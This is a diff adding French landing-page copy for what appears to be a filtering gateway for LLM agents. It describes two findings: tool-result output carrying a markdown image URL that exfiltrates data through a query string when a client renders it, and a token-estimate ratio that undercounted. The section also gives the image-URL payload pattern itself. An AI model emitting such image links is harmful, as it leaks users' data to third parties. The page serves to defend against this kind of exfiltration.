@@ -97,6 +97,50 @@ BODY = (
       </div>
     </section>
 
+
+    <!-- Deux attaques que le reste du champ ne filtre pas -->
+    <section class="mx-auto max-w-6xl px-5 py-16">
+      <h2 class="font-serif text-3xl font-semibold tracking-tight">Deux attaques que personne d'autre ne filtre</h2>
+      <p class="mt-4 max-w-2xl leading-relaxed text-neutral-700 dark:text-neutral-300">
+        Les deux ont été trouvées en envoyant des charges dans le vrai moteur, pas en relisant
+        les motifs — comme la plupart des règles de ce projet.
+      </p>
+      <div class="mt-10 grid gap-5 sm:grid-cols-2">
+        <div class="rounded-2xl border border-neutral-200 p-6 dark:border-neutral-800">
+          <h3 class="text-lg font-semibold">La sortie qui exfiltre parce qu'on la regarde</h3>
+          <p class="mt-3 leading-relaxed text-neutral-700 dark:text-neutral-300">
+            Un résultat d'outil portant
+            <span class="font-mono text-sm">![](https://hote/p.gif?d=…)</span> n'a besoin
+            d'aucune instruction ni d'aucune coopération du modèle : dès qu'un client le rend,
+            le moteur de rendu va chercher l'adresse et la chaîne de requête atterrit dans le
+            journal d'accès de quelqu'un d'autre. Rien ne demande à l'agent d'envoyer quoi que
+            ce soit, donc une règle qui cherche une demande d'envoi ne trouve rien.
+          </p>
+          <p class="mt-3 leading-relaxed text-neutral-700 dark:text-neutral-300">
+            La charge utile ne peut pas être le signal — un seuil de longueur est une chose
+            sous laquelle on se place, et les noms de paramètres appartiennent à l'attaquant.
+            Ce qui marche est une liste blanche d'hôtes dont le contenu non fiable peut se
+            télécharger, c'est-à-dire le modèle de la Content Security Policy, qui ne raisonne
+            jamais sur la charge utile.
+          </p>
+        </div>
+        <div class="rounded-2xl border border-neutral-200 p-6 dark:border-neutral-800">
+          <h3 class="text-lg font-semibold">Une estimation qui refuse du mauvais côté</h3>
+          <p class="mt-3 leading-relaxed text-neutral-700 dark:text-neutral-300">
+            Quand aucun tokenizer n'est joignable, le budget retombe sur un ratio — et ce
+            ratio <strong>sous-estimait jusqu'à 37 %</strong>, dans la direction même de
+            l'incident qui a fait naître ce projet. Mesuré sur treize fichiers réels et trois
+            familles de tokenizers, le vrai chiffre va de 2,51 à 4,23 caractères par jeton.
+          </p>
+          <p class="mt-3 leading-relaxed text-neutral-700 dark:text-neutral-300">
+            Il prend désormais le plancher mesuré, donc l'estimation n'est jamais optimiste,
+            et il le dit : elle surestime la prose ordinaire d'environ la moitié, ce qui est
+            la direction récupérable. Un chiffre qui peut refuser une requête ne doit jamais
+            la flatter.
+          </p>
+        </div>
+      </div>
+    </section>
     <section class="border-y border-neutral-200/70 bg-neutral-50 dark:border-neutral-800 dark:bg-neutral-900/40">
       <div class="mx-auto max-w-6xl px-5 py-16">
         <div class="grid gap-10 md:grid-cols-[1.1fr_1fr] md:items-center">
@@ -149,6 +193,12 @@ BODY = (
         configuré pour. C'est l'argument qui justifie de mettre cela au point d'entrée plutôt
         que dans le harnais de chaque développeur : un plugin se désactive en éditant un
         fichier, et un autre harnais ne l'a simplement jamais eu.
+      </p>
+      <p class="mt-4 max-w-2xl leading-relaxed text-neutral-700 dark:text-neutral-300">
+        L'étape 4 s'applique aussi au <strong>streaming</strong>, ce que tout client d'agent
+        demande par défaut. Un appel d'outil livré en fragments est assemblé et jugé par le
+        même chemin de code qu'un appel atomique, pendant que le texte autour continue de
+        couler intact : aucun client ne peut échapper au filtrage en demandant un flux.
       </p>
       """
     + FLOW
